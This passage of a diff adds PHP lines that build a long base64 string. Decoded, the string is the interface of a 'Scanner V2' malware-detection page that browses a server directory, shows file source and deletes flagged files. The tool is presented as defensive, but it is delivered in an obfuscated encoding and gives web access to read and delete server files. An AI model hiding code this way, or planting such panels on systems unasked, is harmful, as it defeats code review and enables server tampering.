+$z .= "oNCiAgICAgICAgLmZpbGUtaW5mbyB7";
+$z .= "DQogICAgICAgICAgICBmbGV4LWdyb3";
+$z .= "c6IDE7DQogICAgICAgIH0NCg0KICAg";
+$z .= "ICAgICAuZmlsZS1wYXRoIHsNCiAgIC";
+$z .= "AgICAgICAgIGRpc3BsYXk6IGJsb2Nr";
+$z .= "Ow0KICAgICAgICAgICAgY29sb3I6IH";
+$z .= "ZhcigtLWdvbGQpOw0KICAgICAgICAg";
+$z .= "ICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQ";
+$z .= "ogICAgICAgICAgICBmb250LXNpemU6";
+$z .= "IDFlbTsNCiAgICAgICAgICAgIG1hcm";
+$z .= "dpbi1ib3R0b206IDVweDsNCiAgICAg";
+$z .= "ICAgICAgIHdvcmQtYnJlYWs6IGJyZW";
+$z .= "FrLWFsbDsNCiAgICAgICAgICAgIHRl";
+$z .= "eHQtZGVjb3JhdGlvbjogbm9uZTsNCi";
+$z .= "AgICAgICAgICAgIHRyYW5zaXRpb246";
+$z .= "IDAuM3M7DQogICAgICAgIH0NCg0KIC";
+$z .= "AgICAgICAuZmlsZS1wYXRoOmhvdmVy";
+$z .= "IHsNCiAgICAgICAgICAgIGNvbG9yOi";
+$z .= "B3aGl0ZTsNCiAgICAgICAgICAgIHRl";
+$z .= "eHQtc2hhZG93OiAwIDAgMTBweCB2YX";
+$z .= "IoLS1nb2xkKTsNCiAgICAgICAgfQ0K";
+$z .= "DQogICAgICAgIC5wYXR0ZXJuLW1hdG";
+$z .= "NoIHsNCiAgICAgICAgICAgIGZvbnQt";
+$z .= "c2l6ZTogMC44ZW07DQogICAgICAgIC";
+$z .= "AgICBjb2xvcjogIzg4ODsNCiAgICAg";
+$z .= "ICAgfQ0KDQogICAgICAgIC5wYXR0ZX";
+$z .= "JuLW1hdGNoIHNwYW4gew0KICAgICAg";
+$z .= "ICAgICAgY29sb3I6IHZhcigtLXJlZC";
+$z .= "k7DQogICAgICAgICAgICBmb250LWZh";
+$z .= "bWlseTogbW9ub3NwYWNlOw0KICAgIC";
+$z .= "AgICAgICAgZm9udC13ZWlnaHQ6IGJv";
+$z .= "bGQ7DQogICAgICAgIH0NCg0KICAgIC";
+$z .= "AgICBwcmUgew0KICAgICAgICAgICAg";
+$z .= "YmFja2dyb3VuZDogIzAwMDsNCiAgIC";
+$z .= "AgICAgICAgIHBhZGRpbmc6IDE1cHg7";
+$z .= "DQogICAgICAgICAgICBib3JkZXItcm";
+$z .= "FkaXVzOiAxMHB4Ow0KICAgICAgICAg";
+$z .= "ICAgZm9udC1zaXplOiAwLjg1ZW07DQ";
+$z .= "ogICAgICAgICAgICBjb2xvcjogIzBm";
+$z .= "MDsNCiAgICAgICAgICAgIG92ZXJmbG";
+$z .= "93LXg6IGF1dG87DQogICAgICAgICAg";
+$z .= "ICBib3JkZXI6IDFweCBzb2xpZCAjMz";
+$z .= "MzOw0KICAgICAgICAgICAgbWFyZ2lu";
+$z .= "OiAxNXB4IDAgMCAwOw0KICAgICAgIC";
+$z .= "B9DQoNCiAgICAgICAgLmNoZWNrYm94";
+$z .= "LWNvbnRhaW5lciB7DQogICAgICAgIC";
+$z .= "AgICBtYXJnaW4tbGVmdDogMjBweDsN";
+$z .= "CiAgICAgICAgfQ0KDQogICAgICAgIG";
+$z .= "lucHV0W3R5cGU9ImNoZWNrYm94Il0g";
+$z .= "ew0KICAgICAgICAgICAgYWNjZW50LW";
+$z .= "NvbG9yOiB2YXIoLS1nb2xkKTsNCiAg";
+$z .= "ICAgICAgICAgIHdpZHRoOiAyMHB4Ow";
+$z .= "0KICAgICAgICAgICAgaGVpZ2h0OiAy";
+$z .= "MHB4Ow0KICAgICAgICAgICAgY3Vyc2";
+$z .= "9yOiBwb2ludGVyOw0KICAgICAgICB9";
+$z .= "DQoNCiAgICAgICAgLm5vLXJlc3VsdH";
+$z .= "Mgew0KICAgICAgICAgICAgdGV4dC1h";
+$z .= "bGlnbjogY2VudGVyOw0KICAgICAgIC";
+$z .= "AgICAgcGFkZGluZzogMTAwcHggMDsN";
+$z .= "CiAgICAgICAgICAgIGNvbG9yOiB2YX";
+$z .= "IoLS1ncmVlbik7DQogICAgICAgICAg";
+$z .= "ICBmb250LXNpemU6IDEuMmVtOw0KIC";
+$z .= "AgICAgICB9DQoNCiAgICAgICAgLm5v";
+$z .= "dGlmaWNhdGlvbiB7DQogICAgICAgIC";
+$z .= "AgICBwb3NpdGlvbjogZml4ZWQ7DQog";
+$z .= "ICAgICAgICAgICB0b3A6IDIwcHg7DQ";
+$z .= "ogICAgICAgICAgICByaWdodDogMjBw";
+$z .= "eDsNCiAgICAgICAgICAgIGJhY2tncm";
+$z .= "91bmQ6IHZhcigtLWdvbGQpOw0KICAg";
+$z .= "ICAgICAgICAgY29sb3I6IGJsYWNrOw";
+$z .= "0KICAgICAgICAgICAgcGFkZGluZzog";
+$z .= "MTVweCAyNXB4Ow0KICAgICAgICAgIC";
+$z .= "AgYm9yZGVyLXJhZGl1czogMTBweDsN";
+$z .= "CiAgICAgICAgICAgIGZvbnQtd2VpZ2";
+$z .= "h0OiBib2xkOw0KICAgICAgICAgICAg";
+$z .= "Ym94LXNoYWRvdzogMCAxMHB4IDMwcH";
+$z .= "ggcmdiYSgwLDAsMCwwLjUpOw0KICAg";
+$z .= "ICAgICAgICAgei1pbmRleDogMTAwMD";
+$z .= "sNCiAgICAgICAgICAgIGRpc3BsYXk6";
+$z .= "IDw/PSAkZGVsZXRlU3RhdHVzID8gJ2";
+$z .= "Jsb2NrJyA6ICdub25lJyA/PjsNCiAg";
+$z .= "ICAgICAgICAgIGFuaW1hdGlvbjogc2";
+$z .= "xpZGVJbiAwLjVzIGVhc2Utb3V0Ow0K";
+$z .= "ICAgICAgICB9DQoNCiAgICAgICAgQG";
+$z .= "tleWZyYW1lcyBzbGlkZUluIHsNCiAg";
+$z .= "ICAgICAgICAgIGZyb20geyB0cmFuc2";
+$z .= "Zvcm06IHRyYW5zbGF0ZVgoMTAwJSk7";
+$z .= "IH0NCiAgICAgICAgICAgIHRvIHsgdH";
+$z .= "JhbnNmb3JtOiB0cmFuc2xhdGVYKDAp";
+$z .= "OyB9DQogICAgICAgIH0NCg0KICAgIC";
+$z .= "AgICAuZm9vdGVyIHsNCiAgICAgICAg";
+$z .= "ICAgIG1hcmdpbi10b3A6IDUwcHg7DQ";
+$z .= "ogICAgICAgICAgICB0ZXh0LWFsaWdu";
+$z .= "OiBjZW50ZXI7DQogICAgICAgICAgIC";
+$z .= "Bjb2xvcjogIzU1NTsNCiAgICAgICAg";
+$z .= "ICAgIGZvbnQtc2l6ZTogMC44ZW07DQ";
+$z .= "ogICAgICAgICAgICBwYWRkaW5nLWJv";
+$z .= "dHRvbTogNTBweDsNCiAgICAgICAgfQ";
+$z .= "0KDQogICAgICAgIC8qIFJlc3BvbnNp";
+$z .= "dmUgKi8NCiAgICAgICAgQG1lZGlhIC";
+$z .= "htYXgtd2lkdGg6IDYwMHB4KSB7DQog";
+$z .= "ICAgICAgICAgICBoMSB7IGZvbnQtc2";
+$z .= "l6ZTogMS41ZW07IH0NCiAgICAgICAg";
+$z .= "ICAgIC5zdGF0dXMtYmFyIHsgZmxleC";
+$z .= "1kaXJlY3Rpb246IGNvbHVtbjsgYm9y";
+$z .= "ZGVyLXJhZGl1czogMjBweDsgZ2FwOi";
+$z .= "AxNXB4OyB9DQogICAgICAgICAgICAu";
+$z .= "YWN0aW9ucyB7IHdpZHRoOiAxMDAlOy";
+$z .= "BqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRl";
+$z .= "cjsgfQ0KICAgICAgICB9DQogICAgPC";
+$z .= "9zdHlsZT4NCjwvaGVhZD4NCjxib2R5";
+$z .= "Pg0KDQogICAgPGRpdiBjbGFzcz0ibm";
+$z .= "90aWZpY2F0aW9uIiBpZD0ibm90aWYi";
+$z .= "Pg0KICAgICAgICA8Pz0gaHRtbHNwZW";
+$z .= "NpYWxjaGFycygkZGVsZXRlU3RhdHVz";
+$z .= "KSA/Pg0KICAgIDwvZGl2Pg0KDQogIC";
+$z .= "AgPGRpdiBjbGFzcz0iY29udGFpbmVy";
+$z .= "Ij4NCiAgICAgICAgPGhlYWRlcj4NCi";
+$z .= "AgICAgICAgICAgIDxoMT5TY2FubmVy";
+$z .= "IDxzcGFuIHN0eWxlPSJjb2xvcjojZm";
+$z .= "ZmIj5WMjwvc3Bhbj48L2gxPg0KICAg";
+$z .= "ICAgICAgICAgPGRpdiBjbGFzcz0ic3";
+$z .= "VidGl0bGUiPlByZW1pdW0gU2NyaXB0";
+$z .= "IE1hbHdhcmUgRGV0ZWN0aW9uPC9kaX";
+$z .= "Y+DQogICAgICAgIDwvaGVhZGVyPg0K";
+$z .= "DQogICAgICAgIDxmb3JtIG1ldGhvZD";
+$z .= "0iUE9TVCIgaWQ9InNjYW4tZm9ybSI+";
+$z .= "DQogICAgICAgICAgICA8ZGl2IGNsYX";
+$z .= "NzPSJzdGF0dXMtYmFyIj4NCiAgICAg";
+$z .= "ICAgICAgICAgICA8ZGl2IGNsYXNzPS";
+$z .= "JwYXRoLWluZm8iPg0KICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgRElSRUNUT1JZOi";
+$z .= "A8Pz0gaHRtbHNwZWNpYWxjaGFycygk";
+$z .= "YmFzZSkgPz4NCiAgICAgICAgICAgIC";
+$z .= "AgICA8L2Rpdj4NCiAgICAgICAgICAg";
+$z .= "ICAgICA8ZGl2IGNsYXNzPSJhY3Rpb2";
+$z .= "5zIj4NCiAgICAgICAgICAgICAgICAg";
+$z .= "ICAgPGJ1dHRvbiB0eXBlPSJidXR0b2";
+$z .= "4iIGNsYXNzPSJidG4gYnRuLW91dGxp";
+$z .= "bmUiIGlkPSJzZWxlY3QtYWxsIj5TZW";
+$z .= "xlY3QgQWxsPC9idXR0b24+DQogICAg";
+$z .= "ICAgICAgICAgICAgICAgIDxidXR0b2";
+$z .= "4gdHlwZT0ic3VibWl0IiBuYW1lPSJi";
+$z .= "dWxrX2RlbGV0ZSIgY2xhc3M9ImJ0bi";
+$z .= "BidG4tcmVkIiBvbmNsaWNrPSJyZXR1";
+$z .= "cm4gY29uZmlybURlbGV0ZXMoKSI+RG";
+$z .= "VsZXRlIFNlbGVjdGVkPC9idXR0b24+";
+$z .= "DQogICAgICAgICAgICAgICAgICAgID";
+$z .= "xhIGhyZWY9Ij9wYXRoPTw/PSB1cmxl";
+$z .= "bmNvZGUoJGJhc2UpID8+IiBjbGFzcz";
+$z .= "0iYnRuIGJ0bi1nb2xkIj5SZWZyZXNo";
+$z .= "IFNjYW48L2E+DQogICAgICAgICAgIC";
+$z .= "AgICAgPC9kaXY+DQogICAgICAgICAg";
+$z .= "ICA8L2Rpdj4NCg0KICAgICAgICAgIC";
+$z .= "AgPD9waHAgaWYgKGVtcHR5KCRyZXN1";
+$z .= "bHRzKSk6ID8+DQogICAgICAgICAgIC";
+$z .= "AgICAgPGRpdiBjbGFzcz0ibm8tcmVz";
+$z .= "dWx0cyI+DQogICAgICAgICAgICAgIC";
+$z .= "AgICAgIPCfm6HvuI8gQ2xlYW4hIE5v";
+$z .= "IHN1c3BpY2lvdXMgcGF0dGVybnMgZG";
+$z .= "V0ZWN0ZWQgaW4gdGhpcyBkaXJlY3Rv";
+$z .= "cnkuDQogICAgICAgICAgICAgICAgPC";
+$z .= "9kaXY+DQogICAgICAgICAgICA8P3Bo";
+$z .= "cCBlbHNlOiA/Pg0KICAgICAgICAgIC";
+$z .= "AgICAgIDxkaXYgY2xhc3M9InJlc3Vs";
+$z .= "dHMtbGlzdCI+DQogICAgICAgICAgIC";
+$z .= "AgICAgICAgIDw/cGhwIGZvcmVhY2gg";
+$z .= "KCRyZXN1bHRzIGFzICRpbmRleCA9Pi";
+$z .= "Akcik6ID8+DQogICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICA8ZGl2IGNsYXNzPS";
+$z .= "JyZXN1bHQtY2FyZCIgZGF0YS1wYXRo";
+$z .= "PSI8Pz0gaHRtbHNwZWNpYWxjaGFycy";
+$z .= "gkclsnZmlsZSddKSA/PiI+DQogICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgPGRpdiBjbGFzcz0idmlld2VkLWJh";
+$z .= "ZGdlIj5DSEVDS0VEPC9kaXY+DQogIC";
+$z .= "AgICAgICAgICAgICAgICAgICAgICAg";
+$z .= "ICAgPGRpdiBjbGFzcz0iY2FyZC1oZW";
+$z .= "FkZXIiPg0KICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgICA8ZGl2IG";
+$z .= "NsYXNzPSJmaWxlLWluZm8iPg0KICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgICAgICAgICAgIDxhIGhyZWY9Ijw/";
+$z .= "PSBodG1sc3BlY2lhbGNoYXJzKHN0cl";
+$z .= "9yZXBsYWNlKCRfU0VSVkVSWydET0NV";
+$z .= "TUVOVF9ST09UJ10sICcnLCAkclsnZm";
+$z .= "lsZSddKSkgPz4iIA0KICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgICAgICAgIGNsYXNzPSJmaWxlLXBh";
+$z .= "dGgiIHRhcmdldD0iX2JsYW5rIiB0aX";
+$z .= "RsZT0iS2xpayB1bnR1ayBtZW1idWth";
+$z .= "IGZpbGUgZGkgbGF0YXIgYmVsYWthbm";
+$z .= "ciDQogICAgICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgb2";
+$z .= "5jbGljaz0ibWFya0FzVmlld2VkKHRo";
+$z .= "aXMuY2xvc2VzdCgnLnJlc3VsdC1jYX";
+$z .= "JkJyksIHRoaXMuaHJlZiwgZXZlbnQp";
+$z .= "Ij4NCiAgICAgICAgICAgICAgICAgIC";
+$z .= "AgICAgICAgICAgICAgICAgICAgICA8";
+$z .= "Pz0gaHRtbHNwZWNpYWxjaGFycygkcl";
+$z .= "snZmlsZSddKSA/Pg0KICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgICAgPC9hPg0KICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgPGJ1dHRvbiB0eXBlPSJidXR0b24i";
+$z .= "IGNsYXNzPSJidG4tY29kaW5nIiBvbm";
+$z .= "NsaWNrPSJ2aWV3U291cmNlQ29kZSgn";
+$z .= "PD89IGFkZHNsYXNoZXMoJHJbJ2ZpbG";
+$z .= "UnXSkgPz4nKSI+DQogICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgICAgICAg8J+ThCBDT0RJTkcNCiAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgICAgICAgICAgIDwvYnV0dG9uPg0K";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgICAgICAgICAgICAgPGRpdiBjbGFz";
+$z .= "cz0icGF0dGVybi1tYXRjaCI+DQogIC";
+$z .= "AgICAgICAgICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgTWF0Y2hlZD";
+$z .= "ogPHNwYW4+PD89IGh0bWxzcGVjaWFs";
+$z .= "Y2hhcnMoJHJbJ21hdGNoJ10pID8+PC";
+$z .= "9zcGFuPg0KICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgPC";
+$z .= "9kaXY+DQogICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgIDwvZGl2Pg";
+$z .= "0KICAgICAgICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICA8ZGl2IGNsYXNzPS";
+$z .= "JjaGVja2JveC1jb250YWluZXIiIHN0";
+$z .= "eWxlPSJkaXNwbGF5OiBmbGV4OyBhbG";
+$z .= "lnbi1pdGVtczogY2VudGVyOyBnYXA6";
+$z .= "IDEycHg7IG1pbi13aWR0aDogMTQwcH";
+$z .= "g7IGp1c3RpZnktY29udGVudDogZmxl";
+$z .= "eC1lbmQ7Ij4NCiAgICAgICAgICAgIC";
+$z .= "AgICAgICAgICAgICAgICAgICAgICAg";
+$z .= "IDxidXR0b24gdHlwZT0ic3VibWl0Ii";
+$z .= "BuYW1lPSJkZWxldGVfZmlsZXNbXSIg";
+$z .= "dmFsdWU9Ijw/PSBodG1sc3BlY2lhbG";
+$z .= "NoYXJzKCRyWydmaWxlJ10pID8+IiAN";
+$z .= "CiAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgICAgICAgICAgICAgICAgICAgICAg";
+$z .= "Y2xhc3M9ImJ0biBidG4tcmVkIiBzdH";
+$z .= "lsZT0icGFkZGluZzogOHB4IDE4cHg7";
+$z .= "IGZvbnQtc2l6ZTogMTFweDsgd2hpdG";
+$z .= "Utc3BhY2U6IG5vd3JhcDsiDQogICAg";
+$z .= "ICAgICAgICAgICAgICAgICAgICAgIC";
+$z .= "AgICAgICAgICAgICAgICAgIG9uY2xp";
+$z .= "Y2s9InJldHVybiBjb25maXJtKCdIYX";
+$z .= "B1cyBmaWxlIGluaSBwZXJtYW5lbnRs";
+$z .= "eT8nKSI+DQogICAgICAgICAgICAgIC";
+$z .= "AgICAgICAgICAgICAgICAgICAgICAg";
+$z .= "ICAg8J+Xke+4jyBIQVBVUw0KICAgIC";
+$z .= "AgICAgICAgICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgPC9idXR0b24+DQogIC";
+$z .= "AgICAgICAgICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICA8aW5wdXQgdHlwZT";
+$z .= "0iY2hlY2tib3giIG5hbWU9ImRlbGV0";
+$z .= "ZV9maWxlc1tdIiB2YWx1ZT0iPD89IG";
+$z .= "h0bWxzcGVjaWFsY2hhcnMoJHJbJ2Zp";
+$z .= "bGUnXSkgPz4iIGNsYXNzPSJmaWxlLW";
+$z .= "NiIj4NCiAgICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgICAgICAgICAgPC9kaXY+DQ";
+$z .= "ogICAgICAgICAgICAgICAgICAgICAg";
+$z .= "ICAgICAgPC9kaXY+DQogICAgICAgIC";
+$z .= "AgICAgICAgICAgICAgICAgICAgPHBy";
+$z .= "ZT48Y29kZT48Pz0gaHRtbHNwZWNpYW";
+$z .= "xjaGFycyh0cmltKCRyWydzbmlwcGV0";
+$z .= "J10pKSA/PjwvY29kZT48L3ByZT4NCi";
+$z .= "AgICAgICAgICAgICAgICAgICAgICAg";
+$z .= "IDwvZGl2Pg0KICAgICAgICAgICAgIC";
+$z .= "AgICAgICA8P3BocCBlbmRmb3JlYWNo";
+$z .= "OyA/Pg0KICAgICAgICAgICAgICAgID";
+$z .= "wvZGl2Pg0KICAgICAgICAgICAgPD9w";
+$z .= "aHAgZW5kaWY7ID8+DQogICAgICAgID";
+$z .= "wvZm9ybT4NCg0KICAgICAgICA8ZGl2";
+$z .= "IGNsYXNzPSJmb290ZXIiPg0KICAgIC";
+$z .= "AgICAgICAgJmNvcHk7IDIwMjYgUHJl";
+$z .= "bWl1bSBTY2FubmVyIFYyICZidWxsOy";
+$z .= "BQcm9mZXNzaW9uYWwgU2VjdXJpdHkg";
+$z .= "VG9vbHMNCiAgICAgICAgPC9kaXY+DQ";
+$z .= "ogICAgPC9kaXY+DQoNCiAgICA8c2Ny";
+$z .= "aXB0Pg0KICAgICAgICAvLyBTZWxlY3";
+$z .= "QgQWxsIEhhbmRsZXINCiAgICAgICAg";
+$z .= "ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SW";
+$z .= "QoJ3NlbGVjdC1hbGwnKS5hZGRFdmVu";
+$z .= "dExpc3RlbmVyKCdjbGljaycsIGZ1bm";
+$z .= "N0aW9uKCkgew0KICAgICAgICAgICAg";
+$z .= "Y29uc3QgY2hlY2tib3hlcyA9IGRvY3";
+$z .= "VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwo";
+$z .= "Jy5maWxlLWNiJyk7DQogICAgICAgIC";
+$z .= "AgICBjb25zdCBhbGxDaGVja2VkID0g";
+$z .= "QXJyYXkuZnJvbShjaGVja2JveGVzKS";
+$z .= "5ldmVyeShjYiA9PiBjYi5jaGVja2Vk";
+$z .= "KTsNCiAgICAgICAgICAgIGNoZWNrYm";
+$z .= "94ZXMuZm9yRWFjaChjYiA9PiBjYi5j";
+$z .= "aGVja2VkID0gIWFsbENoZWNrZWQpOw";
+$z .= "0KICAgICAgICAgICAgdGhpcy50ZXh0";
+$z .= "Q29udGVudCA9IGFsbENoZWNrZWQgPy";
+$z .= "AnU2VsZWN0IEFsbCcgOiAnRGVzZWxl";
+$z .= "Y3QgQWxsJzsNCiAgICAgICAgfSk7DQ";
+$z .= "oNCiAgICAgICAgZnVuY3Rpb24gbWFy";
+$z .= "a0FzVmlld2VkKGNhcmQsIHVybCwgZX";
+$z .= "ZlbnQpIHsNCiAgICAgICAgICAgIGlm";
+$z .= "IChldmVudCkgZXZlbnQucHJldmVudE";
+$z .= "RlZmF1bHQoKTsNCiAgICAgICAgICAg";
+$z .= "IA0KICAgICAgICAgICAgY29uc3QgcG";
+$z .= "F0aCA9IGNhcmQuZ2V0QXR0cmlidXRl";
+$z .= "KCdkYXRhLXBhdGgnKTsNCiAgICAgIC";
+$z .= "AgICAgIGxldCB2aWV3ZWQgPSBKU09O";
+$z .= "LnBhcnNlKGxvY2FsU3RvcmFnZS5nZX";
+$z .= "RJdGVtKCdzY2FubmVkX3ZpZXdlZF92";
+$z .= "MicpIHx8ICdbXScpOw0KICAgICAgIC";
+$z .= "AgICAgaWYgKCF2aWV3ZWQuaW5jbHVk";
+$z .= "ZXMocGF0aCkpIHsNCiAgICAgICAgIC";
+$z .= "AgICAgICB2aWV3ZWQucHVzaChwYXRo";
+$z .= "KTsNCiAgICAgICAgICAgICAgICBsb2";
+$z .= "NhbFN0b3JhZ2Uuc2V0SXRlbSgnc2Nh";
+$z .= "bm5lZF92aWV3ZWRfdjInLCBKU09OLn";
+$z .= "N0cmluZ2lmeSh2aWV3ZWQpKTsNCiAg";
+$z .= "ICAgICAgICAgIH0NCiAgICAgICAgIC";
+$z .= "AgIGNhcmQuY2xhc3NMaXN0LmFkZCgn";
+$z .= "dmlld2VkJyk7DQoNCiAgICAgICAgIC";
+$z .= "AgIC8vIE9wZW4gYXMgYSBzZXBhcmF0";
+$z .= "ZSBQb3B1cCBXaW5kb3cgYXQgdGhlIE";
+$z .= "xFRlQgU0lERQ0KICAgICAgICAgICAg";
+$z .= "Y29uc3QgcG9wdXBXaWR0aCA9IDEwMD";
+$z .= "A7DQogICAgICAgICAgICBjb25zdCBw";
+$z .= "b3B1cEhlaWdodCA9IDgwMDsNCiAgIC";
+$z .= "AgICAgICAgIGNvbnN0IGxlZnQgPSAy";
+$z .= "MDsgLy8gUG9zaXRpb24gYXQgdGhlIG";
+$z .= "xlZnQgZWRnZQ0KICAgICAgICAgICAg";
+$z .= "Y29uc3QgdG9wID0gNTA7DQogICAgIC";
+$z .= "AgICAgICANCiAgICAgICAgICAgIGNv";
+$z .= "bnN0IG5ld1dpbiA9IHdpbmRvdy5vcG";
+$z .= "VuKHVybCwgJ1NjYW5uZXJWaWV3ZXIn";
+$z .= "LCANCiAgICAgICAgICAgICAgICBgd2";
+$z .= "lkdGg9JHtwb3B1cFdpZHRofSxoZWln";
+$z .= "aHQ9JHtwb3B1cEhlaWdodH0sbGVmdD";
+$z .= "0ke2xlZnR9LHRvcD0ke3RvcH0sc2Ny";
+$z .= "b2xsYmFycz15ZXMscmVzaXphYmxlPX";
+$z .= "llc2ANCiAgICAgICAgICAgICk7DQoN";
+$z .= "CiAgICAgICAgICAgIGlmIChuZXdXaW";
+$z .= "4pIHsNCiAgICAgICAgICAgICAgICAv";
+$z .= "LyBGb2N1cyB0aGUgcG9wdXAgYnV0IG";
+$z .= "FsbG93IHRoZSBwYXJlbnQgdG8gc3Rh";
+$z .= "eSBhY3RpdmUNCiAgICAgICAgICAgIC";
+$z .= "AgICBuZXdXaW4uZm9jdXMoKTsNCiAg";
+$z .= "ICAgICAgICAgICAgICAvLyBXZSBrZW";
+$z .= "VwIHRoZSBzY2FubmVyIGZvY3VzZWQg";
+$z .= "Ynkgc2xpZ2h0bHkgZGVsYXlpbmcgcm";
+$z .= "Vmb2N1c2luZyBpZiBuZWVkZWQsIA0K";
+$z .= "ICAgICAgICAgICAgICAgIC8vIGJ1dC";
+$z .= "B1c3VhbGx5IGEgcG9wdXAgaXMgd2hh";
+$z .= "dCB1c2VycyB3YW50IGZvciAib3V0c2";
+$z .= "lkZSIgZmVlbC4NCiAgICAgICAgICAg";
+$z .= "ICAgICBzZXRUaW1lb3V0KCgpID0+IH";
+$z .= "sNCiAgICAgICAgICAgICAgICAgICAg";
+$z .= "d2luZG93LmZvY3VzKCk7IA0KICAgIC";
+$z .= "AgICAgICAgICAgIH0sIDIwMCk7DQog";
+$z .= "ICAgICAgICAgICB9DQogICAgICAgIH";
+$z .= "0NCg0KICAgICAgICBmdW5jdGlvbiB2";
+$z .= "aWV3U291cmNlQ29kZShmaWxlUGF0aC";
+$z .= "kgew0KICAgICAgICAgICAgY29uc3Qg";
+$z .= "dXJsID0gJz92aWV3X2NvZGU9JyArIG";
+$z .= "VuY29kZVVSSUNvbXBvbmVudChmaWxl";
+$z .= "UGF0aCk7DQogICAgICAgICAgICBjb2";
+$z .= "5zdCBwb3B1cFdpZHRoID0gMTEwMDsN";
+$z .= "CiAgICAgICAgICAgIGNvbnN0IHBvcH";
+$z .= "VwSGVpZ2h0ID0gOTAwOw0KICAgICAg";
+$z .= "ICAgICAgY29uc3QgbGVmdCA9IDIwOy";
+$z .= "AvLyBQb3NpdGlvbiBhdCB0aGUgbGVm";
+$z .= "dCBlZGdlDQogICAgICAgICAgICBjb2";
+$z .= "5zdCB0b3AgPSA1MDsNCiAgICAgICAg";
+$z .= "ICAgIA0KICAgICAgICAgICAgd2luZG";
+$z .= "93Lm9wZW4odXJsLCAnQ29kZVZpZXdl";
+$z .= "cl8nICsgYnRvYShmaWxlUGF0aCkuc3";
+$z .= "Vic3RyaW5nKDAsMTApLCANCiAgICAg";
+$z .= "ICAgICAgICAgICBgd2lkdGg9JHtwb3";
+$z .= "B1cFdpZHRofSxoZWlnaHQ9JHtwb3B1";
+$z .= "cEhlaWdodH0sbGVmdD0ke2xlZnR9LH";
+$z .= "RvcD0ke3RvcH0sc2Nyb2xsYmFycz15";
+$z .= "ZXMscmVzaXphYmxlPXllc2ANCiAgIC";
+$z .= "AgICAgICAgICk7DQogICAgICAgIH0N";
+$z .= "Cg0KICAgICAgICAvLyBBcHBseSB2aW";
+$z .= "V3ZWQgc3RhdHVzIG9uIGxvYWQNCiAg";
+$z .= "ICAgICAgZG9jdW1lbnQuYWRkRXZlbn";
+$z .= "RMaXN0ZW5lcignRE9NQ29udGVudExv";
+$z .= "YWRlZCcsICgpID0+IHsNCiAgICAgIC";
+$z .= "AgICAgIGNvbnN0IHZpZXdlZCA9IEpT";
+$z .= "T04ucGFyc2UobG9jYWxTdG9yYWdlLm";
+$z .= "dldEl0ZW0oJ3NjYW5uZWRfdmlld2Vk";
+$z .= "X3YyJykgfHwgJ1tdJyk7DQogICAgIC";
+$z .= "AgICAgICBkb2N1bWVudC5xdWVyeVNl";
+$z .= "bGVjdG9yQWxsKCcucmVzdWx0LWNhcm";
+$z .= "QnKS5mb3JFYWNoKGNhcmQgPT4gew0K";
+$z .= "ICAgICAgICAgICAgICAgIGNvbnN0IH";
+$z .= "BhdGggPSBjYXJkLmdldEF0dHJpYnV0";
+$z .= "ZSgnZGF0YS1wYXRoJyk7DQogICAgIC";
+$z .= "AgICAgICAgICAgaWYgKHZpZXdlZC5p";
+$z .= "bmNsdWRlcyhwYXRoKSkgew0KICAgIC";
+$z .= "AgICAgICAgICAgICAgICBjYXJkLmNs";
+$z .= "YXNzTGlzdC5hZGQoJ3ZpZXdlZCcpOw";
+$z .= "0KICAgICAgICAgICAgICAgIH0NCiAg";
+$z .= "ICAgICAgICAgIH0pOw0KICAgICAgIC";
+$z .= "B9KTsNCg0KICAgICAgICAvLyBDb25m";
+$z .= "aXJtYXRpb24gTW9kYWwgKFNpbXBsZS";
+$z .= "kNCiAgICAgICAgZnVuY3Rpb24gY29u";
+$z .= "ZmlybURlbGV0ZXMoKSB7DQogICAgIC";
+$z .= "AgICAgICBjb25zdCBjaGVja2VkID0g";
+$z .= "ZG9jdW1lbnQucXVlcnlTZWxlY3Rvck";
+$z .= "FsbCgnLmZpbGUtY2I6Y2hlY2tlZCcp";
+$z .= "Lmxlbmd0aDsNCiAgICAgICAgICAgIG";
+$z .= "lmIChjaGVja2VkID09PSAwKSB7DQog";
+$z .= "ICAgICAgICAgICAgICAgYWxlcnQoJ1";
+$z .= "BsZWFzZSBzZWxlY3QgYXQgbGVhc3Qg";
+$z .= "b25lIGZpbGUgdG8gZGVsZXRlLicpOw";
+$z .= "0KICAgICAgICAgICAgICAgIHJldHVy";
+$z .= "biBmYWxzZTsNCiAgICAgICAgICAgIH";
+$z .= "0NCiAgICAgICAgICAgIHJldHVybiBj";
+$z .= "b25maXJtKGBBcmUgeW91IHN1cmUgeW";
+$z .= "91IHdhbnQgdG8gcGVybWFuZW50bHkg";
+$z .= "ZGVsZXRlICR7Y2hlY2tlZH0gc3VzcG";
+$z .= "ljaW91cyBmaWxlKHMpP2ApOw0KICAg";
+$z .= "ICAgICB9DQoNCiAgICAgICAgLy8gQX";
+$z .= "V0byBoaWRlIG5vdGlmaWNhdGlvbg0K";
